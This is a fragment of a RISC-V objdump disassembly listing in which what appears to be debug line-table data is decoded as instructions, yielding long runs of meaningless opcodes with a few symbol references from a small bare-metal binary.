    1382:	09010307          	0x9010307
    1386:	0004                	0x4
    1388:	0501                	addi	a0,a0,0
    138a:	0903030f          	0x903030f
    138e:	0002                	c.slli	zero,0x0
    1390:	0501                	addi	a0,a0,0
    1392:	09010307          	0x9010307
    1396:	0006                	c.slli	zero,0x1
    1398:	0301                	addi	t1,t1,0
    139a:	00020973          	0x20973
    139e:	0501                	addi	a0,a0,0
    13a0:	030a                	slli	t1,t1,0x2
    13a2:	0910                	addi	a2,sp,144
    13a4:	0002                	c.slli	zero,0x0
    13a6:	0501                	addi	a0,a0,0
    13a8:	0901030f          	0x901030f
    13ac:	000a                	c.slli	zero,0x2
    13ae:	0501                	addi	a0,a0,0
    13b0:	0326                	slli	t1,t1,0x9
    13b2:	0900                	addi	s0,sp,144
    13b4:	0008                	0x8
    13b6:	0501                	addi	a0,a0,0
    13b8:	09010307          	0x9010307
    13bc:	0006                	c.slli	zero,0x1
    13be:	0501                	addi	a0,a0,0
    13c0:	030c                	addi	a1,sp,384
    13c2:	0904                	addi	s1,sp,144
    13c4:	0002                	c.slli	zero,0x0
    13c6:	0501                	addi	a0,a0,0
    13c8:	09010307          	0x9010307
    13cc:	000a                	c.slli	zero,0x2
    13ce:	0301                	addi	t1,t1,0
    13d0:	0904                	addi	s1,sp,144
    13d2:	0002                	c.slli	zero,0x0
    13d4:	0301                	addi	t1,t1,0
    13d6:	0901                	addi	s2,s2,0
    13d8:	001a                	c.slli	zero,0x6
    13da:	0501                	addi	a0,a0,0
    13dc:	030e                	slli	t1,t1,0x3
    13de:	0904                	addi	s1,sp,144
    13e0:	0002                	c.slli	zero,0x0
    13e2:	0501                	addi	a0,a0,0
    13e4:	030a                	slli	t1,t1,0x2
    13e6:	0900                	addi	s0,sp,144
    13e8:	0010                	0x10
    13ea:	0501                	addi	a0,a0,0
    13ec:	0901030b          	0x901030b
    13f0:	0004                	0x4
    13f2:	0501                	addi	a0,a0,0
    13f4:	030a                	slli	t1,t1,0x2
    13f6:	0901                	addi	s2,s2,0
    13f8:	0008                	0x8
    13fa:	0501                	addi	a0,a0,0
    13fc:	0015                	c.nop	5
    13fe:	0402                	slli	s0,s0,0x0
    1400:	0301                	addi	t1,t1,0
    1402:	0900                	addi	s0,sp,144
    1404:	000a                	c.slli	zero,0x2
    1406:	0501                	addi	a0,a0,0
    1408:	0314                	addi	a3,sp,384
    140a:	0901                	addi	s2,s2,0
    140c:	0010                	0x10
    140e:	0501                	addi	a0,a0,0
    1410:	09000317          	auipc	t1,0x9000
    1414:	0004                	0x4
    1416:	0501                	addi	a0,a0,0
    1418:	0314                	addi	a3,sp,384
    141a:	0900                	addi	s0,sp,144
    141c:	000e                	c.slli	zero,0x3
    141e:	0501                	addi	a0,a0,0
    1420:	0309                	addi	t1,t1,2
    1422:	0900                	addi	s0,sp,144
    1424:	000c                	0xc
    1426:	0501                	addi	a0,a0,0
    1428:	0402000b          	0x402000b
    142c:	09010303          	lb	t1,144(sp)
    1430:	0002                	c.slli	zero,0x0
    1432:	0501                	addi	a0,a0,0
    1434:	003e                	c.slli	zero,0xf
    1436:	0402                	slli	s0,s0,0x0
    1438:	097f0303          	lb	t1,151(t5) # 18097 <_tbss_end+0x18013>
    143c:	0012                	c.slli	zero,0x4
    143e:	0501                	addi	a0,a0,0
    1440:	0009                	c.nop	2
    1442:	0402                	slli	s0,s0,0x0
    1444:	0301                	addi	t1,t1,0
    1446:	0900                	addi	s0,sp,144
    1448:	000a                	c.slli	zero,0x2
    144a:	0501                	addi	a0,a0,0
    144c:	09020307          	0x9020307
    1450:	000a                	c.slli	zero,0x2
    1452:	0501                	addi	a0,a0,0
    1454:	0009                	c.nop	2
    1456:	0402                	slli	s0,s0,0x0
    1458:	0305                	addi	t1,t1,1
    145a:	0901                	addi	s2,s2,0
    145c:	0002                	c.slli	zero,0x0
    145e:	0501                	addi	a0,a0,0
    1460:	000a                	c.slli	zero,0x2
    1462:	0402                	slli	s0,s0,0x0
    1464:	0305                	addi	t1,t1,1
    1466:	0901                	addi	s2,s2,0
    1468:	000c                	0xc
    146a:	0501                	addi	a0,a0,0
    146c:	004d                	c.nop	19
    146e:	0402                	slli	s0,s0,0x0
    1470:	0305                	addi	t1,t1,1
    1472:	097e                	slli	s2,s2,0x1f
    1474:	0002                	c.slli	zero,0x0
    1476:	0501                	addi	a0,a0,0
    1478:	0014                	0x14
    147a:	0402                	slli	s0,s0,0x0
    147c:	0301                	addi	t1,t1,0
    147e:	0900                	addi	s0,sp,144
    1480:	000a                	c.slli	zero,0x2
    1482:	0501                	addi	a0,a0,0
    1484:	0012                	c.slli	zero,0x4
    1486:	0402                	slli	s0,s0,0x0
    1488:	0301                	addi	t1,t1,0
    148a:	0900                	addi	s0,sp,144
    148c:	0004                	0x4
    148e:	0501                	addi	a0,a0,0
    1490:	04020007          	0x4020007
    1494:	0301                	addi	t1,t1,0
    1496:	0900                	addi	s0,sp,144
    1498:	0004                	0x4
    149a:	0501                	addi	a0,a0,0
    149c:	0020                	addi	s0,sp,8
    149e:	0402                	slli	s0,s0,0x0
    14a0:	0302                	slli	t1,t1,0x0
    14a2:	0900                	addi	s0,sp,144
    14a4:	0002                	c.slli	zero,0x0
    14a6:	0501                	addi	a0,a0,0
    14a8:	0032                	c.slli	zero,0xc
    14aa:	0402                	slli	s0,s0,0x0
    14ac:	0304                	addi	s1,sp,384
    14ae:	0900                	addi	s0,sp,144
    14b0:	000a                	c.slli	zero,0x2
    14b2:	0501                	addi	a0,a0,0
    14b4:	09040307          	0x9040307
    14b8:	0014                	0x14
    14ba:	0501                	addi	a0,a0,0
    14bc:	0009                	c.nop	2
    14be:	0402                	slli	s0,s0,0x0
    14c0:	0302                	slli	t1,t1,0x0
    14c2:	0901                	addi	s2,s2,0
    14c4:	0002                	c.slli	zero,0x0
    14c6:	0501                	addi	a0,a0,0
    14c8:	001e                	c.slli	zero,0x7
    14ca:	0402                	slli	s0,s0,0x0
    14cc:	0302                	slli	t1,t1,0x0
    14ce:	097f                	0x97f
    14d0:	000e                	c.slli	zero,0x3
    14d2:	0501                	addi	a0,a0,0
    14d4:	04020007          	0x4020007
    14d8:	0301                	addi	t1,t1,0
    14da:	0900                	addi	s0,sp,144
    14dc:	000a                	c.slli	zero,0x2
    14de:	0301                	addi	t1,t1,0
    14e0:	0902                	slli	s2,s2,0x0
    14e2:	000a                	c.slli	zero,0x2
    14e4:	0501                	addi	a0,a0,0
    14e6:	030d                	addi	t1,t1,3
    14e8:	0904                	addi	s1,sp,144
    14ea:	0002                	c.slli	zero,0x0
    14ec:	0501                	addi	a0,a0,0
    14ee:	0900030b          	0x900030b
    14f2:	0012                	c.slli	zero,0x4
    14f4:	0301                	addi	t1,t1,0
    14f6:	0901                	addi	s2,s2,0
    14f8:	0004                	0x4
    14fa:	0501                	addi	a0,a0,0
    14fc:	030a                	slli	t1,t1,0x2
    14fe:	0900                	addi	s0,sp,144
    1500:	0004                	0x4
    1502:	0501                	addi	a0,a0,0
    1504:	0309                	addi	t1,t1,2
    1506:	0901                	addi	s2,s2,0
    1508:	0004                	0x4
    150a:	0501                	addi	a0,a0,0
    150c:	0310                	addi	a2,sp,384
    150e:	0901                	addi	s2,s2,0
    1510:	000e                	c.slli	zero,0x3
    1512:	0501                	addi	a0,a0,0
    1514:	0900030f          	0x900030f
    1518:	0004                	0x4
    151a:	0501                	addi	a0,a0,0
    151c:	030d                	addi	t1,t1,3
    151e:	0900                	addi	s0,sp,144
    1520:	0004                	0x4
    1522:	0501                	addi	a0,a0,0
    1524:	030c                	addi	a1,sp,384
    1526:	0902                	slli	s2,s2,0x0
    1528:	0004                	0x4
    152a:	0501                	addi	a0,a0,0
    152c:	09010307          	0x9010307
    1530:	0006                	c.slli	zero,0x1
    1532:	0501                	addi	a0,a0,0
    1534:	030c                	addi	a1,sp,384
    1536:	0904                	addi	s1,sp,144
    1538:	0002                	c.slli	zero,0x0
    153a:	0501                	addi	a0,a0,0
    153c:	09010307          	0x9010307
    1540:	0006                	c.slli	zero,0x1
    1542:	0501                	addi	a0,a0,0
    1544:	030c                	addi	a1,sp,384
    1546:	0905                	addi	s2,s2,1
    1548:	0002                	c.slli	zero,0x0
    154a:	0501                	addi	a0,a0,0
    154c:	09010307          	0x9010307
    1550:	0006                	c.slli	zero,0x1
    1552:	0501                	addi	a0,a0,0
    1554:	030d                	addi	t1,t1,3
    1556:	0905                	addi	s2,s2,1
    1558:	0002                	c.slli	zero,0x0
    155a:	0501                	addi	a0,a0,0
    155c:	09010307          	0x9010307
    1560:	0006                	c.slli	zero,0x1
    1562:	0301                	addi	t1,t1,0
    1564:	0901                	addi	s2,s2,0
    1566:	000e                	c.slli	zero,0x3
    1568:	0501                	addi	a0,a0,0
    156a:	030c                	addi	a1,sp,384
    156c:	0905                	addi	s2,s2,1
    156e:	000e                	c.slli	zero,0x3
    1570:	0501                	addi	a0,a0,0
    1572:	030d                	addi	t1,t1,3
    1574:	0902                	slli	s2,s2,0x0
    1576:	0006                	c.slli	zero,0x1
    1578:	0501                	addi	a0,a0,0
    157a:	09020307          	0x9020307
    157e:	0014                	0x14
    1580:	0301                	addi	t1,t1,0
    1582:	0901                	addi	s2,s2,0
    1584:	001e                	c.slli	zero,0x7
    1586:	0301                	addi	t1,t1,0
    1588:	0904                	addi	s1,sp,144
    158a:	0002                	c.slli	zero,0x0
    158c:	0301                	addi	t1,t1,0
    158e:	0901                	addi	s2,s2,0
    1590:	000c                	0xc
    1592:	0301                	addi	t1,t1,0
    1594:	0904                	addi	s1,sp,144
    1596:	0002                	c.slli	zero,0x0
    1598:	0501                	addi	a0,a0,0
    159a:	0901030b          	0x901030b
    159e:	000e                	c.slli	zero,0x3
    15a0:	0501                	addi	a0,a0,0
    15a2:	09010307          	0x9010307
    15a6:	0008                	0x8
    15a8:	0501                	addi	a0,a0,0
    15aa:	7ef8030b          	0x7ef8030b
    15ae:	0209                	addi	tp,tp,2
    15b0:	0100                	addi	s0,sp,128
    15b2:	0905                	addi	s2,s2,1
    15b4:	02090203          	lb	tp,32(s2)
    15b8:	0100                	addi	s0,sp,128
    15ba:	0105                	addi	sp,sp,1
    15bc:	09018903          	lb	s2,144(gp) # 80003470 <__global_pointer$+0x90>
    15c0:	0002                	c.slli	zero,0x0
    15c2:	0301                	addi	t1,t1,0
    15c4:	000c0903          	lb	s2,0(s8)
    15c8:	0501                	addi	a0,a0,0
    15ca:	09020303          	lb	t1,144(tp) # 90 <_tbss_end+0xc>
    15ce:	001e                	c.slli	zero,0x7
    15d0:	0301                	addi	t1,t1,0
    15d2:	0902                	slli	s2,s2,0x0
    15d4:	0014                	0x14
    15d6:	0501                	addi	a0,a0,0
    15d8:	030a                	slli	t1,t1,0x2
    15da:	00180903          	lb	s2,1(a6)
    15de:	0501                	addi	a0,a0,0
    15e0:	0301                	addi	t1,t1,0
    15e2:	0901                	addi	s2,s2,0
    15e4:	0002                	c.slli	zero,0x0
    15e6:	0501                	addi	a0,a0,0
    15e8:	09090303          	lb	t1,144(s2)
    15ec:	000a                	c.slli	zero,0x2
    15ee:	0501                	addi	a0,a0,0
    15f0:	030c                	addi	a1,sp,384
    15f2:	0901                	addi	s2,s2,0
    15f4:	0014                	0x14
    15f6:	0501                	addi	a0,a0,0
    15f8:	0306                	slli	t1,t1,0x1
    15fa:	0901                	addi	s2,s2,0
    15fc:	0008                	0x8
    15fe:	0501                	addi	a0,a0,0
    1600:	030c                	addi	a1,sp,384
    1602:	0900                	addi	s0,sp,144
    1604:	0006                	c.slli	zero,0x1
    1606:	0501                	addi	a0,a0,0
    1608:	0306                	slli	t1,t1,0x1
    160a:	0901                	addi	s2,s2,0
    160c:	000c                	0xc
    160e:	0501                	addi	a0,a0,0
    1610:	030c                	addi	a1,sp,384
    1612:	0900                	addi	s0,sp,144
    1614:	0006                	c.slli	zero,0x1
    1616:	0501                	addi	a0,a0,0
    1618:	09010303          	lb	t1,144(sp)
    161c:	000a                	c.slli	zero,0x2
    161e:	0501                	addi	a0,a0,0
    1620:	0301                	addi	t1,t1,0
    1622:	0976                	slli	s2,s2,0x1d
    1624:	0008                	0x8
    1626:	0401                	addi	s0,s0,0
    1628:	03050503          	lb	a0,48(a0) # fffffffffffeb030 <_end+0xffffffff7ffcfb70>
    162c:	20097f8b          	0x20097f8b
    1630:	0100                	addi	s0,sp,128
    1632:	0204                	addi	s1,sp,256
    1634:	0905                	addi	s2,s2,1
    1636:	0900f703          	0x900f703
    163a:	004c                	addi	a1,sp,4
    163c:	0501                	addi	a0,a0,0
    163e:	09010303          	lb	t1,144(sp)
    1642:	0008                	0x8
    1644:	0301                	addi	t1,t1,0
    1646:	0909                	addi	s2,s2,2
    1648:	0014                	0x14
    164a:	0301                	addi	t1,t1,0
    164c:	0901                	addi	s2,s2,0
    164e:	001a                	c.slli	zero,0x6
    1650:	0501                	addi	a0,a0,0
    1652:	0308                	addi	a0,sp,384
    1654:	0900                	addi	s0,sp,144
    1656:	0004                	0x4
    1658:	0501                	addi	a0,a0,0
    165a:	030e                	slli	t1,t1,0x3
    165c:	00040903          	lb	s2,0(s0)
    1660:	0501                	addi	a0,a0,0
    1662:	0301                	addi	t1,t1,0
    1664:	0901                	addi	s2,s2,0
    1666:	000e                	c.slli	zero,0x3
    1668:	0301                	addi	t1,t1,0
    166a:	000a0903          	lb	s2,0(s4)
    166e:	0501                	addi	a0,a0,0
    1670:	0309                	addi	t1,t1,2
    1672:	0901                	addi	s2,s2,0
    1674:	0012                	c.slli	zero,0x4
    1676:	0501                	addi	a0,a0,0
    1678:	0900031b          	addiw	t1,zero,144
    167c:	0004                	0x4
    167e:	0501                	addi	a0,a0,0
    1680:	0319                	addi	t1,t1,6
    1682:	0900                	addi	s0,sp,144
    1684:	0004                	0x4
    1686:	0501                	addi	a0,a0,0
    1688:	032a                	slli	t1,t1,0xa
    168a:	0900                	addi	s0,sp,144
    168c:	0002                	c.slli	zero,0x0
    168e:	0501                	addi	a0,a0,0
    1690:	0331                	addi	t1,t1,12
    1692:	0900                	addi	s0,sp,144
    1694:	0006                	c.slli	zero,0x1
    1696:	0501                	addi	a0,a0,0
    1698:	0306                	slli	t1,t1,0x1
    169a:	0900                	addi	s0,sp,144
    169c:	0002                	c.slli	zero,0x0
    169e:	0501                	addi	a0,a0,0
    16a0:	0316                	slli	t1,t1,0x5
    16a2:	0901                	addi	s2,s2,0
    16a4:	0002                	c.slli	zero,0x0
    16a6:	0501                	addi	a0,a0,0
    16a8:	0310                	addi	a2,sp,384
    16aa:	0901                	addi	s2,s2,0
    16ac:	0008                	0x8
    16ae:	0501                	addi	a0,a0,0
    16b0:	0901030b          	0x901030b
    16b4:	0008                	0x8
    16b6:	0501                	addi	a0,a0,0
    16b8:	0310                	addi	a2,sp,384
    16ba:	0901                	addi	s2,s2,0
    16bc:	0002                	c.slli	zero,0x0
    16be:	0501                	addi	a0,a0,0
    16c0:	0309                	addi	t1,t1,2
    16c2:	0900                	addi	s0,sp,144
    16c4:	000c                	0xc
    16c6:	0501                	addi	a0,a0,0
    16c8:	030e                	slli	t1,t1,0x3
    16ca:	0900                	addi	s0,sp,144
    16cc:	000c                	0xc
    16ce:	0501                	addi	a0,a0,0
    16d0:	030c                	addi	a1,sp,384
    16d2:	0900                	addi	s0,sp,144
    16d4:	0002                	c.slli	zero,0x0
    16d6:	0501                	addi	a0,a0,0
    16d8:	0322                	slli	t1,t1,0x8
    16da:	097f                	0x97f
    16dc:	0002                	c.slli	zero,0x0
    16de:	0501                	addi	a0,a0,0
    16e0:	0900030b          	0x900030b
    16e4:	000a                	c.slli	zero,0x2
    16e6:	0501                	addi	a0,a0,0
    16e8:	0311                	addi	t1,t1,4
    16ea:	000a0903          	lb	s2,0(s4)
    16ee:	0501                	addi	a0,a0,0
    16f0:	0901030b          	0x901030b
    16f4:	0008                	0x8
    16f6:	0301                	addi	t1,t1,0
    16f8:	0901                	addi	s2,s2,0
    16fa:	0008                	0x8
    16fc:	0501                	addi	a0,a0,0
    16fe:	0310                	addi	a2,sp,384
    1700:	0901                	addi	s2,s2,0
    1702:	0002                	c.slli	zero,0x0
    1704:	0501                	addi	a0,a0,0
    1706:	0309                	addi	t1,t1,2
    1708:	0900                	addi	s0,sp,144
    170a:	000c                	0xc
    170c:	0501                	addi	a0,a0,0
    170e:	030e                	slli	t1,t1,0x3
    1710:	0900                	addi	s0,sp,144
    1712:	000c                	0xc
    1714:	0501                	addi	a0,a0,0
    1716:	030c                	addi	a1,sp,384
    1718:	0900                	addi	s0,sp,144
    171a:	0004                	0x4
    171c:	0501                	addi	a0,a0,0
    171e:	031d                	addi	t1,t1,7
    1720:	097f                	0x97f
    1722:	0004                	0x4
    1724:	0501                	addi	a0,a0,0
    1726:	0900030b          	0x900030b
    172a:	000a                	c.slli	zero,0x2
    172c:	0501                	addi	a0,a0,0
    172e:	030a                	slli	t1,t1,0x2
    1730:	00080903          	lb	s2,0(a6)
    1734:	0501                	addi	a0,a0,0
    1736:	0301                	addi	t1,t1,0
    1738:	0901                	addi	s2,s2,0
    173a:	0004                	0x4
    173c:	0301                	addi	t1,t1,0
    173e:	00080903          	lb	s2,0(a6)
    1742:	0501                	addi	a0,a0,0
    1744:	0309                	addi	t1,t1,2
    1746:	0901                	addi	s2,s2,0
    1748:	0014                	0x14
    174a:	0501                	addi	a0,a0,0
    174c:	0319                	addi	t1,t1,6
    174e:	0900                	addi	s0,sp,144
    1750:	0004                	0x4
    1752:	0501                	addi	a0,a0,0
    1754:	0320                	addi	s0,sp,392
    1756:	0900                	addi	s0,sp,144
    1758:	0006                	c.slli	zero,0x1
    175a:	0501                	addi	a0,a0,0
    175c:	0306                	slli	t1,t1,0x1
    175e:	0900                	addi	s0,sp,144
    1760:	0002                	c.slli	zero,0x0
    1762:	0501                	addi	a0,a0,0
    1764:	0901031b          	addiw	t1,sp,144
    1768:	0002                	c.slli	zero,0x0
    176a:	0501                	addi	a0,a0,0
    176c:	0900030f          	0x900030f
    1770:	0004                	0x4
    1772:	0501                	addi	a0,a0,0
    1774:	0312                	slli	t1,t1,0x4
    1776:	0901                	addi	s2,s2,0
    1778:	0008                	0x8
    177a:	0501                	addi	a0,a0,0
    177c:	030a                	slli	t1,t1,0x2
    177e:	0900                	addi	s0,sp,144
    1780:	0006                	c.slli	zero,0x1
    1782:	0501                	addi	a0,a0,0
    1784:	0312                	slli	t1,t1,0x4
    1786:	0901                	addi	s2,s2,0
    1788:	000a                	c.slli	zero,0x2
    178a:	0501                	addi	a0,a0,0
    178c:	030a                	slli	t1,t1,0x2
    178e:	0900                	addi	s0,sp,144
    1790:	0006                	c.slli	zero,0x1
    1792:	0501                	addi	a0,a0,0
    1794:	0318                	addi	a4,sp,384
    1796:	0901                	addi	s2,s2,0
    1798:	000a                	c.slli	zero,0x2
    179a:	0501                	addi	a0,a0,0
    179c:	030a                	slli	t1,t1,0x2
    179e:	0900                	addi	s0,sp,144
    17a0:	0006                	c.slli	zero,0x1
    17a2:	0501                	addi	a0,a0,0
    17a4:	0310                	addi	a2,sp,384
    17a6:	0902                	slli	s2,s2,0x0
    17a8:	000a                	c.slli	zero,0x2
    17aa:	0501                	addi	a0,a0,0
    17ac:	0901030b          	0x901030b
    17b0:	0008                	0x8
    17b2:	0501                	addi	a0,a0,0
    17b4:	0309                	addi	t1,t1,2
    17b6:	0901                	addi	s2,s2,0
    17b8:	0002                	c.slli	zero,0x0
    17ba:	0501                	addi	a0,a0,0
    17bc:	030c                	addi	a1,sp,384
    17be:	0900                	addi	s0,sp,144
    17c0:	000c                	0xc
    17c2:	0501                	addi	a0,a0,0
    17c4:	0322                	slli	t1,t1,0x8
    17c6:	097f                	0x97f
    17c8:	0006                	c.slli	zero,0x1
    17ca:	0501                	addi	a0,a0,0
    17cc:	0900030b          	0x900030b
    17d0:	000a                	c.slli	zero,0x2
    17d2:	0301                	addi	t1,t1,0
    17d4:	000a0903          	lb	s2,0(s4)
    17d8:	0301                	addi	t1,t1,0
    17da:	0901                	addi	s2,s2,0
    17dc:	0008                	0x8
    17de:	0501                	addi	a0,a0,0
    17e0:	0309                	addi	t1,t1,2
    17e2:	0901                	addi	s2,s2,0
    17e4:	0002                	c.slli	zero,0x0
    17e6:	0501                	addi	a0,a0,0
    17e8:	030c                	addi	a1,sp,384
    17ea:	0900                	addi	s0,sp,144
    17ec:	000c                	0xc
    17ee:	0501                	addi	a0,a0,0
    17f0:	031d                	addi	t1,t1,7
    17f2:	097f                	0x97f
    17f4:	000c                	0xc
    17f6:	0501                	addi	a0,a0,0
    17f8:	0900030b          	0x900030b
    17fc:	000a                	c.slli	zero,0x2
    17fe:	0501                	addi	a0,a0,0
    1800:	030a                	slli	t1,t1,0x2
    1802:	00080903          	lb	s2,0(a6)
    1806:	0501                	addi	a0,a0,0
    1808:	0301                	addi	t1,t1,0
    180a:	0901                	addi	s2,s2,0
    180c:	0004                	0x4
    180e:	0301                	addi	t1,t1,0
    1810:	00080903          	lb	s2,0(a6)
    1814:	0501                	addi	a0,a0,0
    1816:	0901030f          	0x901030f
    181a:	000a                	c.slli	zero,0x2
    181c:	0501                	addi	a0,a0,0
    181e:	0309                	addi	t1,t1,2
    1820:	0901                	addi	s2,s2,0
    1822:	0008                	0x8
    1824:	0501                	addi	a0,a0,0
    1826:	0306                	slli	t1,t1,0x1
    1828:	0901                	addi	s2,s2,0
    182a:	0002                	c.slli	zero,0x0
    182c:	0501                	addi	a0,a0,0
    182e:	030a                	slli	t1,t1,0x2
    1830:	097f                	0x97f
    1832:	000a                	c.slli	zero,0x2
    1834:	0501                	addi	a0,a0,0
    1836:	0309                	addi	t1,t1,2
    1838:	0900                	addi	s0,sp,144
    183a:	0008                	0x8
    183c:	0501                	addi	a0,a0,0
    183e:	030c                	addi	a1,sp,384
    1840:	0902                	slli	s2,s2,0x0
    1842:	0002                	c.slli	zero,0x0
    1844:	0501                	addi	a0,a0,0
    1846:	0301                	addi	t1,t1,0
    1848:	0901                	addi	s2,s2,0
    184a:	000c                	0xc
    184c:	0301                	addi	t1,t1,0
    184e:	00080903          	lb	s2,0(a6)
    1852:	0501                	addi	a0,a0,0
    1854:	0901030f          	0x901030f
    1858:	000e                	c.slli	zero,0x3
    185a:	0501                	addi	a0,a0,0
    185c:	0309                	addi	t1,t1,2
    185e:	0901                	addi	s2,s2,0
    1860:	0008                	0x8
    1862:	0501                	addi	a0,a0,0
    1864:	0306                	slli	t1,t1,0x1
    1866:	0901                	addi	s2,s2,0
    1868:	0002                	c.slli	zero,0x0
    186a:	0501                	addi	a0,a0,0
    186c:	097f030b          	0x97f030b
    1870:	000a                	c.slli	zero,0x2
    1872:	0501                	addi	a0,a0,0
    1874:	0309                	addi	t1,t1,2
    1876:	0900                	addi	s0,sp,144
    1878:	000c                	0xc
    187a:	0501                	addi	a0,a0,0
    187c:	0011                	c.nop	4
    187e:	0402                	slli	s0,s0,0x0
    1880:	0301                	addi	t1,t1,0
    1882:	0900                	addi	s0,sp,144
    1884:	0002                	c.slli	zero,0x0
    1886:	0501                	addi	a0,a0,0
    1888:	000e                	c.slli	zero,0x3
    188a:	0402                	slli	s0,s0,0x0
    188c:	0301                	addi	t1,t1,0
    188e:	0900                	addi	s0,sp,144
    1890:	0008                	0x8
    1892:	0501                	addi	a0,a0,0
    1894:	030c                	addi	a1,sp,384
    1896:	0902                	slli	s2,s2,0x0
    1898:	0002                	c.slli	zero,0x0
    189a:	0501                	addi	a0,a0,0
    189c:	0301                	addi	t1,t1,0
    189e:	0901                	addi	s2,s2,0
    18a0:	000c                	0xc
    18a2:	0301                	addi	t1,t1,0
    18a4:	00080903          	lb	s2,0(a6)
    18a8:	0501                	addi	a0,a0,0
    18aa:	000d                	c.nop	3
    18ac:	0402                	slli	s0,s0,0x0
    18ae:	0302                	slli	t1,t1,0x0
    18b0:	0904                	addi	s1,sp,144
    18b2:	000e                	c.slli	zero,0x3
    18b4:	0501                	addi	a0,a0,0
    18b6:	0008                	0x8
    18b8:	0402                	slli	s0,s0,0x0
    18ba:	0302                	slli	t1,t1,0x0
    18bc:	0900                	addi	s0,sp,144
    18be:	000c                	0xc
    18c0:	0501                	addi	a0,a0,0
    18c2:	000d                	c.nop	3
    18c4:	0402                	slli	s0,s0,0x0
    18c6:	0302                	slli	t1,t1,0x0
    18c8:	0901                	addi	s2,s2,0
    18ca:	0008                	0x8
    18cc:	0501                	addi	a0,a0,0
    18ce:	0008                	0x8
    18d0:	0402                	slli	s0,s0,0x0
    18d2:	0302                	slli	t1,t1,0x0
    18d4:	0900                	addi	s0,sp,144
    18d6:	000c                	0xc
    18d8:	0501                	addi	a0,a0,0
    18da:	04020003          	lb	zero,64(tp) # 40 <buf.2990>
    18de:	0302                	slli	t1,t1,0x0
    18e0:	0901                	addi	s2,s2,0
    18e2:	0008                	0x8
    18e4:	0501                	addi	a0,a0,0
    18e6:	0014                	0x14
    18e8:	0402                	slli	s0,s0,0x0
    18ea:	0301                	addi	t1,t1,0
    18ec:	0900                	addi	s0,sp,144
    18ee:	000a                	c.slli	zero,0x2
    18f0:	0501                	addi	a0,a0,0
    18f2:	030d                	addi	t1,t1,3
    18f4:	0902                	slli	s2,s2,0x0
    18f6:	0014                	0x14
    18f8:	0501                	addi	a0,a0,0
    18fa:	0301                	addi	t1,t1,0
    18fc:	0901                	addi	s2,s2,0
    18fe:	0014                	0x14
    1900:	0301                	addi	t1,t1,0
    1902:	00080903          	lb	s2,0(a6)
    1906:	0501                	addi	a0,a0,0
    1908:	0309                	addi	t1,t1,2
    190a:	0901                	addi	s2,s2,0
    190c:	000e                	c.slli	zero,0x3
    190e:	0301                	addi	t1,t1,0
    1910:	0901                	addi	s2,s2,0
    1912:	0008                	0x8
    1914:	0501                	addi	a0,a0,0
    1916:	0016                	c.slli	zero,0x5
    1918:	0402                	slli	s0,s0,0x0
    191a:	0301                	addi	t1,t1,0
    191c:	0900                	addi	s0,sp,144
    191e:	0002                	c.slli	zero,0x0
    1920:	0501                	addi	a0,a0,0
    1922:	000d                	c.nop	3
    1924:	0402                	slli	s0,s0,0x0
    1926:	0301                	addi	t1,t1,0
    1928:	0900                	addi	s0,sp,144
    192a:	000c                	0xc
    192c:	0501                	addi	a0,a0,0
    192e:	0012                	c.slli	zero,0x4
    1930:	0402                	slli	s0,s0,0x0
    1932:	0301                	addi	t1,t1,0
    1934:	0900                	addi	s0,sp,144
    1936:	000c                	0xc
    1938:	0501                	addi	a0,a0,0
    193a:	0010                	0x10
    193c:	0402                	slli	s0,s0,0x0
    193e:	0301                	addi	t1,t1,0
    1940:	0900                	addi	s0,sp,144
    1942:	0004                	0x4
    1944:	0501                	addi	a0,a0,0
    1946:	0402000b          	0x402000b
    194a:	0301                	addi	t1,t1,0
    194c:	0900                	addi	s0,sp,144
    194e:	0004                	0x4
    1950:	0501                	addi	a0,a0,0
    1952:	0009                	c.nop	2
    1954:	0402                	slli	s0,s0,0x0
    1956:	0301                	addi	t1,t1,0
    1958:	0900                	addi	s0,sp,144
    195a:	0004                	0x4
    195c:	0501                	addi	a0,a0,0
    195e:	030a                	slli	t1,t1,0x2
    1960:	0902                	slli	s2,s2,0x0
    1962:	0002                	c.slli	zero,0x0
    1964:	0501                	addi	a0,a0,0
    1966:	0301                	addi	t1,t1,0
    1968:	0901                	addi	s2,s2,0
    196a:	0004                	0x4
    196c:	0301                	addi	t1,t1,0
    196e:	00080903          	lb	s2,0(a6)
    1972:	0501                	addi	a0,a0,0
    1974:	0308                	addi	a0,sp,384
    1976:	0901                	addi	s2,s2,0
    1978:	000a                	c.slli	zero,0x2
    197a:	0501                	addi	a0,a0,0
    197c:	09010307          	0x9010307
    1980:	0004                	0x4
    1982:	0501                	addi	a0,a0,0
    1984:	0309                	addi	t1,t1,2
    1986:	0902                	slli	s2,s2,0x0
    1988:	0004                	0x4
    198a:	0501                	addi	a0,a0,0
    198c:	0308                	addi	a0,sp,384
    198e:	0901                	addi	s2,s2,0
    1990:	0002                	c.slli	zero,0x0
    1992:	0501                	addi	a0,a0,0
    1994:	030a                	slli	t1,t1,0x2
    1996:	097f                	0x97f
    1998:	000a                	c.slli	zero,0x2
    199a:	0501                	addi	a0,a0,0
    199c:	0309                	addi	t1,t1,2
    199e:	0900                	addi	s0,sp,144
    19a0:	0008                	0x8
    19a2:	0501                	addi	a0,a0,0
    19a4:	09030307          	0x9030307
    19a8:	000a                	c.slli	zero,0x2
    19aa:	0501                	addi	a0,a0,0
    19ac:	0306                	slli	t1,t1,0x1
    19ae:	0900                	addi	s0,sp,144
    19b0:	0008                	0x8
    19b2:	0501                	addi	a0,a0,0
    19b4:	0016                	c.slli	zero,0x5
    19b6:	0402                	slli	s0,s0,0x0
    19b8:	0301                	addi	t1,t1,0
    19ba:	0900                	addi	s0,sp,144
    19bc:	000a                	c.slli	zero,0x2
    19be:	0501                	addi	a0,a0,0
    19c0:	04020013          	addi	zero,tp,64 # 40 <buf.2990>
    19c4:	0301                	addi	t1,t1,0
    19c6:	0900                	addi	s0,sp,144
    19c8:	0008                	0x8
    19ca:	0501                	addi	a0,a0,0
    19cc:	030c                	addi	a1,sp,384
    19ce:	0901                	addi	s2,s2,0
    19d0:	000a                	c.slli	zero,0x2
    19d2:	0501                	addi	a0,a0,0
    19d4:	0311                	addi	t1,t1,4
    19d6:	0900                	addi	s0,sp,144
    19d8:	0008                	0x8
    19da:	0501                	addi	a0,a0,0
    19dc:	030a                	slli	t1,t1,0x2
    19de:	0900                	addi	s0,sp,144
    19e0:	0014                	0x14
    19e2:	0501                	addi	a0,a0,0
    19e4:	0308                	addi	a0,sp,384
    19e6:	0901                	addi	s2,s2,0
    19e8:	0004                	0x4
    19ea:	0501                	addi	a0,a0,0
